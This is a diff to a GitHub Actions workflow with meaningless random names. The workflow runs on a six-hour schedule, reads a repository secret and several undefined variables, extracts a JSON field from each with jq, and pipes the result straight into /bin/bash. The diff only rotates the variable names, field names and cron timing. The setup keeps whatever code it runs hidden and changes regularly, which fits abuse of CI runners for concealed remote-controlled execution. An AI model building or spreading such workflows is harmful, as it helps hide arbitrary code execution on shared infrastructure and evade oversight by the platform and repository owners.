@@ -1,10 +1,10 @@
 name: ambitionparka
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 5/6 * * *'
-jobs:  # 11306
+    - cron: '6 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,14 +12,15 @@ jobs:  # 11306
       - uses: actions/checkout@v4
       - name: ambitionparka
         env:
-          brb233: ${{ secrets.brb233 }}
+          tswb83962: ${{ secrets.tswb83962 }}
         run: |
-          echo $brb233 | jq -r .h4487 | /bin/bash
-          echo $xjg1599 | jq -r .pjyi38 | /bin/bash
-          echo $mu1 | jq -r .przt0 | /bin/bash
-          echo $mpeh699 | jq -r .ekycw7 | /bin/bash
-          echo $luy3028 | jq -r .kesx3 | /bin/bash
-          echo $ltwj684 | jq -r .c003 | /bin/bash
-          echo $gwi0419 | jq -r .cdd66 | /bin/bash
-          echo $qlju625 | jq -r .yccel616 | /bin/bash
+          echo $tswb83962 | jq -r .wdywl79464 | /bin/bash
+          echo $sifc227 | jq -r .x070 | /bin/bash
+          echo $mgc12 | jq -r .hfjzb930 | /bin/bash
+          echo $vipj9 | jq -r .x38 | /bin/bash
+          echo $m1976 | jq -r .cvd5251 | /bin/bash
+          echo $k3155 | jq -r .dw24207 | /bin/bash
+          echo $yq093 | jq -r .lkkf63334 | /bin/bash
+          echo $qbrdg6700 | jq -r .dti7232 | /bin/bash
+          echo $pz596 | jq -r .ma2503 | /bin/bash
 
